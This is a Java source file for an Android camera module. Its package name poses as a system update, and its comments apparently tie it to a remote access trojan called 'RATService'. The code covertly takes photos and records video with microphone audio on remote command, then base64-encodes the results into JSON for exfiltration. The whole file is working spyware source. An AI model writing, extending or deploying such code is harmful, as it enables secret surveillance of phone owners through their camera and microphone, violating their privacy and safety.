package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";

    // ── Photo constants — kept from your working version ──────────────────────
    private static final int CAPTURE_TIMEOUT_SECONDS = 10;
    private static final int MAX_RETRY_ATTEMPTS       = 3;
    private static final int TEST_IMAGE_WIDTH         = 640;
    private static final int TEST_IMAGE_HEIGHT        = 480;

    private final Context       context;
    private final CameraManager cameraManager;

    // ── Two independent background threads ────────────────────────────────────
    private final HandlerThread photoThread;
    private final Handler       photoHandler;
    private final HandlerThread videoThread;
    private final Handler       videoHandler;

    private final Handler mainHandler;

    private String  currentCameraId;
    private String  backCameraId;
    private String  frontCameraId;
    private boolean isUsingFrontCamera = false;

    // ── Photo-only resources ──────────────────────────────────────────────────
    private ImageReader          photoImageReader;
    private CameraDevice         photoCameraDevice;
    private CameraCaptureSession photoCaptureSession;

    // ── Video-only resources ──────────────────────────────────────────────────
    private ImageReader          videoImageReader;
    private CameraDevice         videoCameraDevice;
    private CameraCaptureSession videoCaptureSession;
    private MediaRecorder        videoRecorder;
    private boolean              isRecordingVideo = false;
    private String               currentVideoPath;

    // ── Constructor ───────────────────────────────────────────────────────────

    public CameraModule(Context context) {
        Log.d(TAG, "📸 CameraModule constructor called");
        this.context       = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.mainHandler   = new Handler(Looper.getMainLooper());

        photoThread = new HandlerThread("CameraPhotoThread");
        photoThread.start();
        photoHandler = new Handler(photoThread.getLooper());

        videoThread = new HandlerThread("CameraVideoThread");
        videoThread.start();
        videoHandler = new Handler(videoThread.getLooper());

        findCameras();
    }

    // ── Camera discovery ──────────────────────────────────────────────────────

    private void findCameras() {
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            Log.d(TAG, "📸 Available cameras: " + Arrays.toString(cameraIdList));

            for (String id : cameraIdList) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                    backCameraId = id;
                    Log.d(TAG, "📸 Found back camera: " + id);
                } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    frontCameraId = id;
                    Log.d(TAG, "📸 Found front camera: " + id);
                }
            }

            if (backCameraId != null) {
                currentCameraId    = backCameraId;
                isUsingFrontCamera = false;
            } else if (frontCameraId != null) {
                currentCameraId    = frontCameraId;
                isUsingFrontCamera = true;
            } else if (cameraIdList.length > 0) {
                currentCameraId = cameraIdList[0];
            }
            Log.d(TAG, "📸 Using camera: " + currentCameraId);
        } catch (Exception e) {
            Log.e(TAG, "❌ Error finding cameras", e);
        }
    }

    // ── Switch camera ─────────────────────────────────────────────────────────

    public String switchCamera() {
        if (isRecordingVideo) return "ERROR: Stop recording before switching camera";
        closePhotoCamera();
        if (isUsingFrontCamera) {
            if (backCameraId == null) return "ERROR: No back camera available";
            currentCameraId    = backCameraId;
            isUsingFrontCamera = false;
            return "SUCCESS: Switched to back camera";
        } else {
            if (frontCameraId == null) return "ERROR: No front camera available";
            currentCameraId    = frontCameraId;
            isUsingFrontCamera = true;
            return "SUCCESS: Switched to front camera";
        }
    }

    public String getCurrentCamera() { return isUsingFrontCamera ? "front" : "back"; }

    // ── Photo resource management ─────────────────────────────────────────────

    private synchronized void closePhotoCamera() {
        try { if (photoCaptureSession != null) { photoCaptureSession.close(); photoCaptureSession = null; } } catch (Exception ignored) {}
        try { if (photoCameraDevice   != null) { photoCameraDevice.close();   photoCameraDevice   = null; } } catch (Exception ignored) {}
        try { if (photoImageReader    != null) { photoImageReader.close();    photoImageReader    = null; } } catch (Exception ignored) {}
    }

    // ── Video resource management ─────────────────────────────────────────────

    private synchronized void closeVideoCamera() {
        try { if (videoCaptureSession != null) { videoCaptureSession.close(); videoCaptureSession = null; } } catch (Exception ignored) {}
        try { if (videoCameraDevice   != null) { videoCameraDevice.close();   videoCameraDevice   = null; } } catch (Exception ignored) {}
        try { if (videoImageReader    != null) { videoImageReader.close();    videoImageReader    = null; } } catch (Exception ignored) {}
    }

    private void releaseVideoRecorder() {
        if (videoRecorder != null) {
            try { videoRecorder.stop();    } catch (Exception ignored) {}
            try { videoRecorder.reset();   } catch (Exception ignored) {}
            try { videoRecorder.release(); } catch (Exception ignored) {}
            videoRecorder = null;
        }
    }

    // ── Permission check ──────────────────────────────────────────────────────

    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }

    // ── Size helpers ──────────────────────────────────────────────────────────

    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs == null) return new Size(1920, 1080);
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) return new Size(1920, 1080);
            Size largest = sizes[0];
            for (Size s : sizes) {
                if ((long) s.getWidth() * s.getHeight() > (long) largest.getWidth() * largest.getHeight()) {
                    largest = s;
                }
            }
            Log.d(TAG, "📐 Largest size: " + largest.getWidth() + "x" + largest.getHeight());
            return largest;
        } catch (Exception e) {
            Log.e(TAG, "Error getting largest size", e);
            return new Size(1920, 1080);
        }
    }

    private Size getSmallestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs == null) return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);
            Size smallest = sizes[0];
            for (Size s : sizes) {
                if ((long) s.getWidth() * s.getHeight() < (long) smallest.getWidth() * smallest.getHeight()) {
                    smallest = s;
                }
            }
            return smallest;
        } catch (Exception e) {
            return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);
        }
    }

    private Size getBestVideoSize() {
        try {
            StreamConfigurationMap m = cameraManager
                    .getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (m == null) return new Size(1280, 720);
            Size[] sizes = m.getOutputSizes(MediaRecorder.class);
            if (sizes == null || sizes.length == 0) return new Size(1280, 720);
            for (Size s : sizes) if (s.getWidth() == 1920 && s.getHeight() == 1080) return s;
            Size best = sizes[0];
            for (Size s : sizes) {
                if (s.getWidth() <= 1920 && s.getHeight() <= 1080
                        && (long) s.getWidth() * s.getHeight() > (long) best.getWidth() * best.getHeight()) {
                    best = s;
                }
            }
            return best;
        } catch (Exception e) {
            return new Size(1280, 720);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  takePhoto  —  restored from your working version, photo resources only
    // ─────────────────────────────────────────────────────────────────────────

    public String takePhoto() {
        Log.d(TAG, "📸 takePhoto() called with camera: " + currentCameraId);

        if (!checkPermission())      return "ERROR: No camera permission";
        if (currentCameraId == null) return "ERROR: No camera available";
        if (isRecordingVideo)        return "ERROR: Cannot take photo while recording video";

        // Close only photo resources — never touches video
        closePhotoCamera();

        final AtomicReference<String> result = new AtomicReference<>("ERROR: Failed to capture");
        final CountDownLatch           latch  = new CountDownLatch(1);

        for (int attempt = 0; attempt < MAX_RETRY_ATTEMPTS; attempt++) {
            try {
                Log.d(TAG, "📸 Capture attempt " + (attempt + 1) + "/" + MAX_RETRY_ATTEMPTS);

                final File photoFile = File.createTempFile("photo", ".jpg",
                        context.getExternalFilesDir(null));

                Size largest = getLargestSize();
                photoImageReader = ImageReader.newInstance(
                        largest.getWidth(), largest.getHeight(), ImageFormat.JPEG, 2);

                photoImageReader.setOnImageAvailableListener(reader -> {
                    Log.d(TAG, "📸 Image available");
                    try (Image image = reader.acquireLatestImage()) {
                        if (image == null) {
                            result.set("ERROR: Image is null");
                            latch.countDown();
                            return;
                        }
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        Log.d(TAG, "📸 Image bytes: " + bytes.length);
                        try (FileOutputStream fos = new FileOutputStream(photoFile)) {
                            fos.write(bytes);
                        }
                        byte[] fileBytes = readFileToBytes(photoFile);
                        String base64 = Base64.encodeToString(fileBytes, Base64.NO_WRAP);
                        photoFile.delete();
                        result.set(base64);
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error in ImageAvailableListener", e);
                        result.set("ERROR: " + e.getMessage());
                    } finally {
                        latch.countDown();
                    }
                }, photoHandler);

                cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice device) {
                        Log.d(TAG, "✅ Camera opened");
                        photoCameraDevice = device;
                        try {
                            List<Surface> surfaces = new ArrayList<>();
                            surfaces.add(photoImageReader.getSurface());
                            device.createCaptureSession(surfaces,
                                    new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(CameraCaptureSession session) {
                                            Log.d(TAG, "✅ Session configured");
                                            photoCaptureSession = session;
                                            try {
                                                CaptureRequest.Builder builder =
                                                        device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                builder.addTarget(photoImageReader.getSurface());
                                                builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                                builder.set(CaptureRequest.CONTROL_AF_MODE,
                                                        CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                builder.set(CaptureRequest.CONTROL_AE_MODE,
                                                        CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                                                session.capture(builder.build(),
                                                        new CameraCaptureSession.CaptureCallback() {
                                                            @Override
                                                            public void onCaptureCompleted(CameraCaptureSession s,
                                                                    CaptureRequest req, TotalCaptureResult r) {
                                                                Log.d(TAG, "✅ Capture completed");
                                                            }
                                                        }, photoHandler);
                                            } catch (Exception e) {
                                                Log.e(TAG, "❌ Error creating capture request", e);
                                                result.set("ERROR: " + e.getMessage());
                                                latch.countDown();
                                                closePhotoCamera();
                                            }
                                        }
                                        @Override
                                        public void onConfigureFailed(CameraCaptureSession session) {
                                            Log.e(TAG, "❌ Session configure failed");
                                            result.set("ERROR: Session configure failed");
                                            latch.countDown();
                                            closePhotoCamera();
                                        }
                                    }, photoHandler);
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error creating session", e);
                            result.set("ERROR: " + e.getMessage());
                            latch.countDown();
                            closePhotoCamera();
                        }
                    }
                    @Override
                    public void onDisconnected(CameraDevice device) {
                        Log.w(TAG, "⚠️ Camera disconnected");
                        device.close();
                        photoCameraDevice = null;
                        result.set("ERROR: Camera disconnected");
                        latch.countDown();
                    }
                    @Override
                    public void onError(CameraDevice device, int error) {
                        Log.e(TAG, "❌ Camera error: " + error);
                        device.close();
                        photoCameraDevice = null;
                        result.set("ERROR: Camera error: " + error);
                        latch.countDown();
                    }
                }, photoHandler);

                if (latch.await(CAPTURE_TIMEOUT_SECONDS, TimeUnit.SECONDS)) {
                    String finalResult = result.get();
                    if (finalResult != null && !finalResult.startsWith("ERROR")) {
                        Log.d(TAG, "✅ Photo captured successfully");
                        closePhotoCamera();
                        return finalResult;
                    } else if (attempt < MAX_RETRY_ATTEMPTS - 1) {
                        Log.w(TAG, "⚠️ Capture failed, retrying...");
                        closePhotoCamera();
                        Thread.sleep(500);
                        continue;
                    } else {
                        closePhotoCamera();
                        return finalResult != null ? finalResult : "ERROR: Unknown error";
                    }
                } else {
                    if (attempt < MAX_RETRY_ATTEMPTS - 1) {
                        Log.w(TAG, "⚠️ Capture timeout, retrying...");
                        closePhotoCamera();
                        continue;
                    } else {
                        closePhotoCamera();
                        return "ERROR: Capture timeout after " + CAPTURE_TIMEOUT_SECONDS + " seconds";
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error in takePhoto attempt " + (attempt + 1), e);
                closePhotoCamera();
                if (attempt < MAX_RETRY_ATTEMPTS - 1) {
                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                } else {
                    return "ERROR: " + e.getMessage();
                }
            }
        }

        return "ERROR: All capture attempts failed";
    }

    // ── captureTestImage — restored from working version ──────────────────────

    public String captureTestImage() {
        Log.d(TAG, "📸 captureTestImage()");
        if (!checkPermission()) return "ERROR: No camera permission";
        if (currentCameraId == null) return "ERROR: No camera available";

        closePhotoCamera();

        final AtomicReference<String> result = new AtomicReference<>("ERROR");
        final CountDownLatch latch = new CountDownLatch(1);

        try {
            Size testSize = getSmallestSize();
            photoImageReader = ImageReader.newInstance(
                    testSize.getWidth(), testSize.getHeight(), ImageFormat.JPEG, 2);

            photoImageReader.setOnImageAvailableListener(reader -> {
                try (Image image = reader.acquireLatestImage()) {
                    if (image == null) { result.set("ERROR: Image null"); latch.countDown(); return; }
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    result.set("SUCCESS:" + bytes.length + ":" + Base64.encodeToString(bytes, Base64.NO_WRAP));
                } catch (Exception e) {
                    result.set("ERROR: " + e.getMessage());
                } finally {
                    latch.countDown();
                }
            }, photoHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice device) {
                    photoCameraDevice = device;
                    try {
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(photoImageReader.getSurface());
                        device.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession session) {
                                photoCaptureSession = session;
                                try {
                                    CaptureRequest.Builder builder =
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(photoImageReader.getSurface());
                                    builder.set(CaptureRequest.JPEG_QUALITY, (byte) 80);
                                    builder.set(CaptureRequest.CONTROL_AF_MODE,
                                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                    session.capture(builder.build(), null, photoHandler);
                                } catch (Exception e) {
                                    result.set("ERROR: " + e.getMessage()); latch.countDown(); closePhotoCamera();
                                }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession s) {
                                result.set("ERROR: Session configure failed"); latch.countDown(); closePhotoCamera();
                            }
                        }, photoHandler);
                    } catch (Exception e) {
                        result.set("ERROR: " + e.getMessage()); latch.countDown(); closePhotoCamera();
                    }
                }
                @Override public void onDisconnected(CameraDevice d) {
                    d.close(); result.set("ERROR: Camera disconnected"); latch.countDown();
                }
                @Override public void onError(CameraDevice d, int e) {
                    d.close(); result.set("ERROR: Camera error: " + e); latch.countDown();
                }
            }, photoHandler);

            boolean done = latch.await(5000, TimeUnit.MILLISECONDS);
            closePhotoCamera();
            return done ? result.get() : "ERROR: Test capture timeout";

        } catch (Exception e) {
            closePhotoCamera();
            return "ERROR: " + e.getMessage();
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Video recording  —  uses entirely separate resources from photo
    // ─────────────────────────────────────────────────────────────────────────

    public String startRecording(String args) {
        if (!checkPermission())      return "ERROR: No camera permission";
        if (isRecordingVideo)        return "ERROR: Already recording";
        if (currentCameraId == null) return "ERROR: No camera available";

        closeVideoCamera();
        releaseVideoRecorder();

        int maxDurationSec = 60;
        if (args != null && !args.isEmpty()) {
            try { maxDurationSec = Integer.parseInt(args.trim()); } catch (NumberFormatException ignored) {}
        }

        final CountDownLatch          latch = new CountDownLatch(1);
        final AtomicReference<String> sr    = new AtomicReference<>(null);

        try {
            Size videoSize = getBestVideoSize();
            Log.d(TAG, "🎥 Video size: " + videoSize.getWidth() + "×" + videoSize.getHeight());

            File dir = context.getExternalFilesDir("videos");
            if (dir != null && !dir.exists()) dir.mkdirs();
            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            currentVideoPath = (dir != null ? dir.getAbsolutePath()
                                            : context.getCacheDir().getAbsolutePath())
                    + "/VID_" + ts + ".mp4";

            videoRecorder = new MediaRecorder();
            videoRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            videoRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            videoRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            videoRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            videoRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            videoRecorder.setVideoSize(videoSize.getWidth(), videoSize.getHeight());
            videoRecorder.setVideoFrameRate(30);
            videoRecorder.setVideoEncodingBitRate(6_000_000);
            videoRecorder.setAudioEncodingBitRate(192_000);
            videoRecorder.setAudioSamplingRate(44100);
            videoRecorder.setMaxDuration(maxDurationSec * 1000);
            videoRecorder.setOutputFile(currentVideoPath);
            videoRecorder.prepare();

            final Surface recorderSurface = videoRecorder.getSurface();

            videoImageReader = ImageReader.newInstance(320, 240, ImageFormat.YUV_420_888, 2);
            videoImageReader.setOnImageAvailableListener(
                    r -> { try (Image i = r.acquireLatestImage()) { /* discard */ } catch (Exception ignored) {} },
                    videoHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice device) {
                    videoCameraDevice = device;
                    try {
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(recorderSurface);
                        surfaces.add(videoImageReader.getSurface());
                        device.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession session) {
                                videoCaptureSession = session;
                                try {
                                    CaptureRequest.Builder b =
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                    b.addTarget(recorderSurface);
                                    b.addTarget(videoImageReader.getSurface());
                                    b.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
                                    b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                    b.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                    session.setRepeatingRequest(b.build(), null, videoHandler);
                                    videoRecorder.start();
                                    isRecordingVideo = true;
                                    sr.set("SUCCESS: Recording started — " + currentVideoPath);
                                    Log.d(TAG, "🎥 Recording started: " + currentVideoPath);
                                } catch (Exception e) {
                                    sr.set("ERROR: " + e.getMessage());
                                } finally { latch.countDown(); }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession s) {
                                sr.set("ERROR: Session configure failed"); latch.countDown();
                            }
                        }, videoHandler);
                    } catch (Exception e) {
                        sr.set("ERROR: " + e.getMessage()); latch.countDown();
                    }
                }
                @Override public void onDisconnected(CameraDevice d) {
                    d.close(); videoCameraDevice = null; sr.set("ERROR: Camera disconnected"); latch.countDown();
                }
                @Override public void onError(CameraDevice d, int e) {
                    d.close(); videoCameraDevice = null; sr.set("ERROR: Camera error " + e); latch.countDown();
                }
            }, videoHandler);

            latch.await(8, TimeUnit.SECONDS);
            if (sr.get() == null) {
                releaseVideoRecorder(); closeVideoCamera();
                return "ERROR: Timeout starting recording";
            }
            if (sr.get().startsWith("ERROR")) {
                releaseVideoRecorder(); closeVideoCamera();
            }
            return sr.get();

        } catch (Exception e) {
            Log.e(TAG, "startRecording error", e);
            releaseVideoRecorder(); closeVideoCamera();
            return "ERROR: " + e.getMessage();
        }
    }

    // ── stopRecording returns plain JSON — RATService adds "FILE_GET|" prefix ─
    public String stopRecording() {
        if (!isRecordingVideo) return "ERROR: No active recording";
        try {
            isRecordingVideo = false;
            try { if (videoCaptureSession != null) videoCaptureSession.stopRepeating(); } catch (Exception ignored) {}
            closeVideoCamera();
            releaseVideoRecorder();

            File f = new File(currentVideoPath);
            if (!f.exists() || f.length() == 0) return "ERROR: Video file empty or missing";

            Log.d(TAG, "🎥 Video saved: " + f.length() + " bytes — encoding...");
            byte[] bytes = readFileToBytes(f);
            String b64   = Base64.encodeToString(bytes, Base64.NO_WRAP);

            // Plain JSON — RATService's video_record_stop case wraps it in FILE_GET|
            JSONObject resp = new JSONObject();
            resp.put("success",   true);
            resp.put("command",   "video_recording_result");
            resp.put("status",    "success");
            resp.put("name",      f.getName());
            resp.put("file_name", f.getName());
            resp.put("file_size", f.length());
            resp.put("size",      f.length());
            resp.put("data",      b64);
            resp.put("file_data", b64);
            resp.put("path",      f.getAbsolutePath());
            return resp.toString();

        } catch (Exception e) {
            Log.e(TAG, "stopRecording error", e);
            isRecordingVideo = false;
            return "ERROR: " + e.getMessage();
        }
    }

    // ── Diagnostics ───────────────────────────────────────────────────────────

    public String testCapture() {
        if (!checkPermission()) return "ERROR: No camera permission";
        CountDownLatch latch = new CountDownLatch(1);
        AtomicReference<String> r = new AtomicReference<>("Failed");
        try {
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) { d.close(); r.set("SUCCESS"); latch.countDown(); }
                @Override public void onDisconnected(CameraDevice d) { r.set("ERROR: Disconnected"); latch.countDown(); }
                @Override public void onError(CameraDevice d, int e)  { r.set("ERROR: " + e); latch.countDown(); }
            }, photoHandler);
            return latch.await(5000, TimeUnit.MILLISECONDS) ? r.get() : "ERROR: Timeout opening camera";
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String testCamera() {
        if (!checkPermission()) return "ERROR: No camera permission";
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            String f = facing != null && facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT";
            return "SUCCESS: Camera " + currentCameraId + " (" + f + ") is available";
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String testCamera2() {
        if (!checkPermission()) return "ERROR: No camera permission";
        try {
            StringBuilder report = new StringBuilder("Camera test results:\n");
            String[] cameraIds = cameraManager.getCameraIdList();
            report.append("Total cameras: ").append(cameraIds.length).append("\n");
            for (String id : cameraIds) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                String f = facing != null && facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT";
                report.append("Camera ").append(id).append(" (").append(f).append(")\n");
                StreamConfigurationMap m = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (m != null) {
                    Size[] js = m.getOutputSizes(ImageFormat.JPEG);
                    if (js != null && js.length > 0)
                        report.append("  Max JPEG: ").append(js[0].getWidth()).append("x").append(js[0].getHeight()).append("\n");
                }
            }
            report.append("Current camera: ").append(currentCameraId);
            return "SUCCESS: " + report;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String checkCameraStatus() {
        try {
            StringBuilder sb = new StringBuilder();
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                String f = facing != null && facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT";
                sb.append("Camera ").append(id).append(" (").append(f).append(")")
                  .append(id.equals(currentCameraId) ? " [CURRENT]" : "").append("\n");
            }
            return "SUCCESS: " + sb;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String simpleTest() {
        try {
            Integer lvl = cameraManager.getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
            String s = lvl == null ? "UNKNOWN" :
                    lvl == CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_FULL    ? "FULL"    :
                    lvl == CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LIMITED ? "LIMITED" :
                    lvl == CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LEGACY  ? "LEGACY"  : "LEVEL_3";
            return "SUCCESS: Camera hardware level: " + s;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String simpleCapture() { return "SUCCESS: Camera accessible"; }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private byte[] readFileToBytes(File f) throws IOException {
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] b = new byte[(int) f.length()];
            fis.read(b);
            return b;
        }
    }

    public void cleanup() {
        closePhotoCamera();
        closeVideoCamera();
        releaseVideoRecorder();
        photoThread.quitSafely();
        videoThread.quitSafely();
        try { photoThread.join(); } catch (InterruptedException ignored) {}
        try { videoThread.join(); } catch (InterruptedException ignored) {}
    }
}
